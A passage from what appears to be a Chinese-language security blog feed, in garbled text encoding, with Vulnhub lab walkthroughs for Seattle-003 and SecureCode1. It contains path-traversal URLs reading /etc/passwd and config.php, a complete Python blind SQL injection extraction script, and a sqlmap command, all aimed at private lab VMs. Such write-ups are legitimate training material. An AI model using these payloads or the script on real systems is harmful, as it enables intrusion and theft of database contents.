src="/img/Vulnhub-Seattle-003/image-20240210105210851.png" alt="image-20240210105210851"></p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶"><a href="#1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶"></a>1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶</h3><p>1ã€åœ¨downloadsç›®å½•ä¸‹å‘ç°.pdfæ–‡ä»¶</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105554332.png" alt="image-20240210105554332"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105619577.png" alt="image-20240210105619577"></p><p>æ˜¯ä¸€ä¸ªå¯¹ç½‘ç«™æ­¤æ—¶çŠ¶æ€çš„ä¸€ä¸ªæè¿°ï¼Œè¡¨ç¤ºç°åœ¨çš„ç½‘ç«™æœ‰å¾ˆå¤šæ¼æ´ï¼Œè¯¸å¦‚SQLæ¼æ´ã€XSSã€ç”¨æˆ·åæ³„éœ²ä»¥åŠä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105728931.png" alt="image-20240210105728931"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105742640.png" alt="image-20240210105742640"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105806973.png" alt="image-20240210105806973"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210105954501.png" alt="image-20240210105954501"></p><h3 id="2ã€ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´"><a href="#2ã€ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´" class="headerlink" title="2ã€ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´"></a>2ã€ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´</h3><p>é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´å°è¯•ä¸‹è½½&#x2F;etc&#x2F;passwwd æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.59/download.php?item=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210110317205.png" alt="image-20240210110317205"></p><p>åªå­˜åœ¨rootç”¨æˆ·</p><p>ä¸‹è½½config.phpæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.59/download.php?item=../config.php</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-Seattle-003/image-20240210114250835.png" alt="image-20240210114250835"></p><p>æ‹¿åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼šroot:Alexis*94</p><h3 id="3ã€SQLæ³¨å…¥æ¼æ´"><a href="#3ã€SQLæ³¨å…¥æ¼æ´" class="headerlink" title="3ã€SQLæ³¨å…¥æ¼æ´"></a>3ã€SQLæ³¨å…¥æ¼æ´</h3><p>æˆ‘ä»¬å¯¹<code>http://192.168.31.59/details.php?type=2&amp;prod=5</code>è·¯å¾„è¿›è¡Œçˆ†ç ´ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„SQLæ³¨å…¥ï¼Œæˆ‘ä»¬ä¿®è¿›æˆ‘ä»¬çš„SQL_Boole è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># å­˜åœ¨GETç±»å‹çš„SQLæ³¨å…¥çš„URLé“¾æ¥å’Œå‚æ•°</span><br><span class="line">url = &#x27;http://192.168.31.59/details.php?type=2&amp;prod=5&#x27;</span><br><span class="line"></span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):         #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µçš„å€¼</span><br><span class="line">        for j in range(1,column_data_len[i]+1):     #jæ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in range(0,126):                  #næ˜¯è¦çˆ†ç ´å­—æ®µå€¼çš„asciiç å€¼</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;&#123;User_column_name&#125;å­—æ®µçš„ç¬¬&#123;i&#125;ä¸ªå€¼ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">def column_data_length(column_names,User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):           #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µçš„å€¼ï¼ŒçŒœæµ‹10ä¸ªæ•°å€¼</span><br><span class="line">        for j in range(1,20):       #jæ˜¯è¦çˆ†ç ´å­—æ®µæ•°å€¼çš„é•¿åº¦ï¼ŒçŒœæµ‹è¯¥å­—æ®µæ•°å€¼æœ€å¤§ä¸º20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;å·²è¶…è¿‡æµ‹è¯•æ•°å€¼çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):          #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œlen(column_len) æ˜¯å­—æ®µçš„æ•°é‡</span><br><span class="line">        for j in range(1,column_len[i]+1):      #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">            for n in range(0,126):              #næ˜¯è¦çˆ†ç ´å­—æ®µåçš„asciiç å€¼</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    column_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;&#123;User_table_name&#125;è¡¨çš„ç¬¬&#123;i&#125;ä¸ªå­—æ®µçš„åç§°ä¸ºï¼š&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">def column_length(User_table_name):     #è¦æŸ¥çœ‹çš„è¡¨å</span><br><span class="line">    column_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):               #iæ˜¯ç¬¬å‡ ä¸ªå­—æ®µï¼Œè¿™é‡Œå‡è®¾æœ‰10ä¸ªå­—æ®µ</span><br><span class="line">        for j in range(1,30):           #jæ˜¯è¦çˆ†ç ´å­—æ®µçš„é•¿åº¦ï¼Œå‡è®¾å­—æ®µé•¿åº¦æœ€é•¿ä¸º20</span><br><span class="line">            new_url = url + &quot;%20and%20length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;+ hex(int.from_bytes(User_table_name.encode(), &#x27;big&#x27;)) +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                column_len[i] = j</span><br><span class="line">                if i == 10:</span><br><span class="line">                    print(&#x27;å·²è¶…è¿‡æµ‹è¯•å­—æ®µæ•°çš„æœ€å¤§å€¼ï¼Œè¯·è°ƒæ•´ï¼ï¼ï¼&#x27;)</span><br><span class="line">                break</span><br><span class="line">    return column_len</span><br><span class="line"></span><br><span class="line">def table_name(table_len):</span><br><span class="line">    table_names = &#123;&#125;</span><br><span class="line">    table_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(table_len)):       #iæ˜¯ç¬¬å‡ å¼ è¡¨ï¼Œlen(table_len)è¡¨ç¤ºå…±æœ‰å‡ å¼ è¡¨</span><br><span class="line">        for j in range(1,table_len[i]+1):   #jæ˜¯è¦çˆ†ç ´è¡¨åç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œåˆ°è¡¨çš„é•¿åº¦</span><br><span class="line">            for n in range(0,126):          #næ˜¯è¦çˆ†ç ´è¡¨åçš„asciiç å€¼</span><br><span class="line">                new_url = url + &quot;%20and%20ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(n)</span><br><span class="line">                if Response_judgment(new_url):</span><br><span class="line">                    table_one_name += chr(n)</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;ç¬¬&#123;i&#125;å¼ è¡¨çš„åç§°ä¸ºï¼š&#123;table_one_name&#125;&quot;)</span><br><span class="line">        table_names[i] = table_one_name</span><br><span class="line">        table_one_name = &#x27;&#x27;</span><br><span class="line">    return table_names</span><br><span class="line"></span><br><span class="line">def table_length():</span><br><span class="line">    table_len = &#123;&#125;</span><br><span class="line">    for i in range(0,10):           #iæ˜¯ç¬¬å‡ å¼ è¡¨</span><br><span class="line">        for j in range(1,10):       #jæ˜¯è¦çˆ†ç ´è¡¨çš„é•¿åº¦</span><br><span class="line">            new_url = url + &quot;%20and%20length((select table_name from information_schema.tables where table_schema=database() limit &quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                table_len[i] = j</span><br><span class="line">                break</span><br><span class="line">    return table_len</span><br><span class="line"></span><br><span class="line">def database_name(database_len):</span><br><span class="line">    database_names = &#x27;&#x27;</span><br><span class="line">    for i in range(1,database_len + 1):     #iæ˜¯æ•°æ®åº“çš„ç¬¬å‡ ä¸ªå­—ç¬¦</span><br><span class="line">        for j in range(0,126):              #jæ˜¯è¦çˆ†ç ´æ•°æ®åº“åçš„asciiç å€¼</span><br><span class="line">            new_url = url + &quot;%20and%20ascii(substr(database(),&quot; + str(i) + &quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(new_url):</span><br><span class="line">                database_names += chr(j)</span><br><span class="line">                break</span><br><span class="line">    return database_names</span><br><span class="line"></span><br><span class="line">def database_length():</span><br><span class="line">    new_url = &#x27;&#x27;</span><br><span class="line">    for i in range(1,10):       #å‡è®¾æ•°æ®åº“çš„é•¿åº¦åœ¨10ä»¥å†…</span><br><span class="line">        new_url = url + &quot;%20and%20length(database())=&quot; + str(i)</span><br><span class="line">        if Response_judgment(new_url):</span><br><span class="line">            return i</span><br><span class="line">    print(&#x27;payloadæ— æ•ˆï¼Œè¯·æ›´æ›¿payloadæˆ–å¢åŠ çˆ†ç ´çš„æ•°æ®åº“åé•¿åº¦ï¼ï¼ï¼&#x27;)</span><br><span class="line">    print(new_url)</span><br><span class="line"></span><br><span class="line">def Response_judgment(new_url):</span><br><span class="line">    cookies = &#123;</span><br><span class="line">        &#x27;level&#x27; : &#x27;1&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    respone = requests.get(new_url, cookies=cookies)</span><br><span class="line">    if &quot;T-Shirt&quot; in respone.text:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    database_names = database_name(database_length())   #è¿™é‡Œä¼ å…¥æ•°æ®åº“çš„é•¿åº¦</span><br><span class="line">    print(f&quot;å½“å‰æ•°æ®åº“çš„åç§°ä¸ºï¼š&#123;database_names&#125;&quot;)</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    table_names = table_name(table_length())            #æ±‚è¡¨çš„åç§°ï¼Œä¼ å…¥è¡¨çš„é•¿åº¦</span><br><span class="line">    while True:                 #è¿™é‡Œåšæ— é™å¾ªç¯ï¼Œä»¥æ–¹ä¾¿å¾ªç¯æŸ¥è¯¢æ‰€æœ‰çš„è¡¨</span><br><span class="line">        print(&#x27;-----------------------------&#x27;)</span><br><span class="line">        print(f&quot;æ‰€æœ‰è¡¨çš„åç§°ä¸ºï¼š&#123;table_names&#125;&quot;)</span><br><span class="line">        User_table_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„è¡¨åï¼ˆexité€€å‡ºï¼‰ï¼š&#x27;)</span><br><span class="line">        if User_table_name == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        print(&#x27;-----------------------------&#x27;)</span><br><span class="line">        column_names = column_name(column_length(User_table_name),User_table_name)       #æ±‚å­—æ®µçš„åå­—ï¼Œè¾“å…¥å­—æ®µçš„é•¿åº¦</span><br><span class="line">        while True:             #è¿™é‡Œåšæ— é™å¾ªç¯ï¼Œæ–¹ä¾¿æŸ¥è¯¢è¡¨çš„æ‰€æœ‰å­—æ®µå€¼</span><br><span class="line">            print(&#x27;-----------------------------&#x27;)</span><br><span class="line">            print(f&quot;è¯¥è¡¨ä¸­æ‰€æœ‰å­—æ®µçš„åç§°ä¸ºï¼š&#123;column_names&#125;&quot;)</span><br><span class="line">            User_column_name = input(&#x27;è¯·è¾“å…¥è¦æŸ¥çœ‹çš„å­—æ®µåï¼ˆexité€€å‡ºï¼‰ï¼š&#x27;)</span><br><span class="line">            if User_column_name == &#x27;exit&#x27;:</span><br><span class="line">                break</span><br><span class="line">            print(&#x27;-----------------------------&#x27;)</span><br><span class="line">            column_data_len = column_data_length(column_names,User_table_name,User_column_name)   #æ±‚å­—æ®µå€¼çš„é•¿åº¦ï¼Œä¼ å…¥å­—æ®µçš„åç§°</span><br><span class="line">            column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #æ±‚å­—æ®µçš„å€¼</span><br><span class="line">            print(&#x27;-----------------------------&#x27;)</span><br><span class="line">            print(f&quot;&#123;User_column_name&#125;å­—æ®µä¸­æ‰€æœ‰æ•°å€¼ä¸ºï¼š&#123;column_data_names&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">    print(&#x27;-----------------------------&#x27;)</span><br><span class="line">    print(&quot;Byeï¼ç¨‹åºå·²é€€å‡ºï¼ï¼ï¼&quot;)</span><br></pre></td></tr></table></figure><p>åœ¨åˆ¤æ–­å‡½æ•°ä¸­åŠ å…¥cookieä»¥åŠä¿®æ”¹åˆ¤æ–­æ¡ä»¶å³å¯</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123233979.png" alt="image-20240210123233979"></p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123406099.png" alt="image-20240210123406099"></p><p>è¿™é‡Œå¹¶æ²¡æœ‰æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œä¹Ÿè®¸æ˜¯è„šæœ¬æœ‰äº›åœ°æ–¹è€ƒè™‘ä¸å‘¨åˆ°ï¼Œä½†æ˜¯å¯¹è„šæœ¬çš„åº”ç”¨æ˜¯ä¸€æ¬¡ä¸é”™çš„æå‡</p><h3 id="4ã€ç™»å½•åå°"><a href="#4ã€ç™»å½•åå°" class="headerlink" title="4ã€ç™»å½•åå°"></a>4ã€ç™»å½•åå°</h3><p>é€šè¿‡ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œä¸‹è½½login.phpæ–‡ä»¶è¿›è¡Œåˆ†æ</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123540577.png" alt="image-20240210123540577"></p><p>å…ˆåˆ¤æ–­äº†ç”¨æˆ·çš„é‚®ç®±ï¼Œå†åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®</p><p>æ­£å¥½åœ¨blog.php?author&#x3D;1çš„é¡µé¢ä¸­çˆ†ç ´äº†ç”¨æˆ·é‚®ç®±çš„æ•æ„Ÿä¿¡æ¯ï¼Œé‚£ä¹ˆæ ¹æ®æºä»£ç åˆ†ææ­¤å¤„å¯ä»¥é€ æˆSQLæ¼æ´</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210123636194.png" alt="image-20240210123636194"></p><p>æˆ‘ä»¬æ‹¿åˆ°ç”¨æˆ·é‚®ç®±ï¼Œå›åˆ°ç™»å½•é¡µé¢ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨sqlmap è¿›è¡Œçˆ†ç ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.cmd -u http://192.168.31.59/login.php --data &quot;usermail=admin@seattlesounds.net&amp;password=111*&quot; --cookie &quot;level=1&quot; --batch -D seattle --tables</span><br></pre></td></tr></table></figure><p>åœ¨çˆ†ç ´è¿‡ç¨‹ä¸­å‘ç°è¯¥æ•°æ®åº“æœ‰ä¸‰å¼ è¡¨</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210125137460.png" alt="image-20240210125137460"></p><p>è€ŒSQL_Boole è„šæœ¬æœªçˆ†ç ´å‡ºæ¥å…¶ä»–ä¸¤å¼ è¡¨çš„åŸå› æ˜¯ï¼Œæˆ‘ä»¬å‡è®¾è¡¨çš„æœ€å¤§é•¿åº¦ä¸º10</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210125347335.png" alt="image-20240210125347335"></p><p>å½“æˆ‘ä»¬ä¿®æ”¹æˆ20ä¹‹åï¼ŒSQL_Boole è„šæœ¬å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œä¸”çˆ†ç ´é€Ÿåº¦æ¯”SQLMap è¿˜è¦å¿«ä¸Šå¾ˆå¤š</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210125903261.png" alt="image-20240210125903261"></p><p>è¿™é‡Œusername æ— æ•°æ®ï¼Œå¯èƒ½ä¹Ÿæ˜¯é•¿åº¦é™åˆ¶çš„é—®é¢˜ï¼Œä½†æ˜¯å¥½åœ¨å¯†ç çš„é•¿åº¦è¾ƒçŸ­ï¼Œå¯ä»¥çˆ†ç ´å‡ºæ¥</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210130050742.png" alt="image-20240210130050742"></p><p>ä¹Ÿå¯ä»¥çˆ†ç ´å‡ºæ¥å…¶ä»–å­—æ®µï¼Œä¸è¿‡åœ¨æ”¹é¶æœºä¸­æˆ‘ä»¬åªæ‹¿åˆ°å¯†ç å³å¯</p><p><img src="/img/Vulnhub-Seattle-003/image-20240210130209765.png" alt="image-20240210130209765"></p><p>åå°ç™»å½•æˆåŠŸ</p><h3 id="5ã€è·å–shellç«‹è¶³ç‚¹"><a href="#5ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="5ã€è·å–shellç«‹è¶³ç‚¹"></a>5ã€è·å–shellç«‹è¶³ç‚¹</h3><p>åœ¨åå°å¯ä»¥æäº¤åšå®¢å†…å®¹ï¼Œä½†æ˜¯æ— getshell çš„æ–¹æ³•ï¼Œæ­¤é¶æœºåªæœ‰webæ¼æ´ï¼Œä¸èƒ½getshell</p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhub_SecureCode1</title>
      <link href="/2024/02/17/Vulnhub-SecureCode1/"/>
      <url>/2024/02/17/Vulnhub-SecureCode1/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-SecureCode1é¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-SecureCode1é¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_SecureCode1é¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_SecureCode1é¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><p>1ã€ä»ç™¾åº¦ç½‘ç›˜ä¸‹è½½å¯¹åº”é¶æœºçš„.ovaé•œåƒ</p><p>2ã€åœ¨VMä¸­é€‰æ‹©ã€æ‰“å¼€ã€‘è¯¥.ova</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209184001407.png" alt="image-20240209184001407"></p><p>3ã€é€‰æ‹©å­˜å‚¨è·¯å¾„ï¼Œå¹¶æ‰“å¼€</p><p><img src="/img/Vulnhub-SecureCode1/image-20240209184019990.png" alt="image-20240209184019990"></p><p>4ã€ä¹‹åç¡®è®¤ç½‘ç»œè¿æ¥æ¨¡å¼æ˜¯å¦ä¸ºã€NATã€‘</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><p><img src="/img/Vulnhub-SecureCode1/image-20240207163539575.png" alt="image-20240207163539575"></p><h3 id="2ã€ç«¯å£æ¢æµ‹"><a href="#2ã€ç«¯å£æ¢æµ‹" class="headerlink" title="2ã€ç«¯å£æ¢æµ‹"></a>2ã€ç«¯å£æ¢æµ‹</h3><p>1ã€å¿«é€Ÿç²—ç•¥æ¢æµ‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163617743.png" alt="image-20240207163617743"></p><p>åªå‘ç°80ç«¯å£</p><p>2ã€è¿›è¡Œç²¾ç»†åŒ–æ¢æµ‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163652742.png" alt="image-20240207163652742"></p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163700245.png" alt="image-20240207163700245"></p><p>ä»ç„¶åªæœ‰80ç«¯å£</p><p>3ã€è¿›è¡Œå…¨æ‰«æå’Œæ¼æ´æ¢æµ‹</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163926406.png" alt="image-20240207163926406"></p><p>ä¸€ä¸ªUbuntu çš„Linuxæœºå™¨</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207163842603.png" alt="image-20240207163842603"></p><p>å‘ç°æ–‡ä»¶ä¸Šä¼ å’ŒSQLæ³¨å…¥æ¼æ´ï¼Œæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¼€ç«¯</p><h3 id="3ã€å¯¹webç›®å½•çˆ†ç ´"><a href="#3ã€å¯¹webç›®å½•çˆ†ç ´" class="headerlink" title="3ã€å¯¹webç›®å½•çˆ†ç ´"></a>3ã€å¯¹webç›®å½•çˆ†ç ´</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.61 -x 404,403#è¿‡æ»¤404ï¼Œ403å“åº”</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-SecureCode1/image-20240207164030015.png" alt="image-20240207164030015"></p><h3 id="4ã€webæ¡†æ¶æ¢æµ‹"><a href="#4ã€webæ¡†æ¶æ¢æµ‹" class="headerlink" title="4ã€webæ¡†æ¶æ¢æµ‹"></a>4ã€webæ¡†æ¶æ¢æµ‹</h3><p><img src="/img/Vulnhub-SecureCode1/image-20240207164250119.png" alt="image-20240207164250119"></p><p>ä½¿ç”¨äº†Bootstrap çš„å‰ç«¯å¼€å‘æ¡†æ¶å’ŒJQuery åº“</p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶"><a href="#1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶"></a>1ã€æŸ¥çœ‹æ•æ„Ÿæ–‡ä»¶</h3><p>1ã€robots.txtï¼šæç¤ºç¦æ­¢å»&#x2F;login&#x2F;*ï¼Œä¸å…è®¸è®¿é—®loginä¸‹çš„ä»»ä½•æ–‡ä»¶</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207170232753.png" alt="image-20240207170232753"></p><p>2ã€loginç›®å½•ï¼šæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207170321419.png" alt="image-20240207170321419"></p><p>3ã€æŸ¥çœ‹å…¶ä»–ç›®å½•æç¤ºæ— æƒé™</p><p><img src="/img/Vulnhub-SecureCode1/image-20240207182037225.png" alt="image-20240207182037225"></p><h3 id="2ã€æºä»£ç æ–‡ä»¶æ³„éœ²"><a href="#2ã€æºä»£ç æ–‡ä»¶æ³„éœ²" class="headerlink" 